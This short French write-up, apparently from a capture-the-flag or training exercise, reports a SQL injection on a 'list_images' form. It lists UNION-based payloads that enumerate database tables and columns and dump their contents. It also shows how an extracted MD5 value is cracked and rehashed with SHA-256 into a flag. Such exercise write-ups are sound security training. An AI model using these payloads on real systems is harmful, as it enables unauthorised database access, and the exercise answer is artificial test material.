# Rapport de Vulnérabilité : Injection SQL (list\_images)

## Nom de la Faille

Injection SQL

## OWASP
**A03:2021 – Injection**

## Description

Cette faille est similaire à l'injection SQL sur 'Members ID'. Elle permet également d'exécuter des requêtes SQL arbitraires via un formulaire, en accédant à des informations sensibles dans la base de données. La table ciblée est `list_images`, et l'exploitation suit le même processus que précédemment.

## Commandes Utilisées

```
1 UNION ALL SELECT 1, DATABASE()

1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables

1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns

1 AND 1=2 UNION SELECT {column_name}, null FROM list_images
```

## Traitement des données extraites

Dans la colonne `comment`, nous obtenons un code MD5 qu'il faut :

1. Déchiffrer en MD5.
2. Mettre en minuscule.
3. Encrypter en SHA-256.

### Exemple de traitement

- Code MD5 extrait : 1928e8083cf461a51303633093573c46
- Décodage MD5 : `albatroz`
- Encodage SHA-256 :

```
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

## Conclusion

Cette injection SQL est similaire à celle de 'Members ID', exploitant des failles d'entrée utilisateur non sécurisées. En appliquant les mêmes mesures correctives, vous réduisez considérablement le risque de compromission des données.